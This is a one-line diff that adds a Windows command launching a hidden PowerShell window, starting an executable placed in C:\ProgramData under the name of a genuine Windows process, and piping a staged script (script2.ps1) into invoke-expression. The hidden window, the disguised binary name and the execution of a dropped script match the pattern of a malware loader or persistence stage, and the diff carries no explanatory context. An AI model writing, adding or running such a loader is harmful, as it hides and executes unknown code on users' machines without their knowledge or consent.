@@ -1,0 +1,1 @@
+start powershell -windowstyle hidden Start-Process -FilePath "C:\ProgramData\ApplicationFrameHost.exe"; "cat -raw C:\ProgramData\script2.ps1 | invoke-expression"; Exit
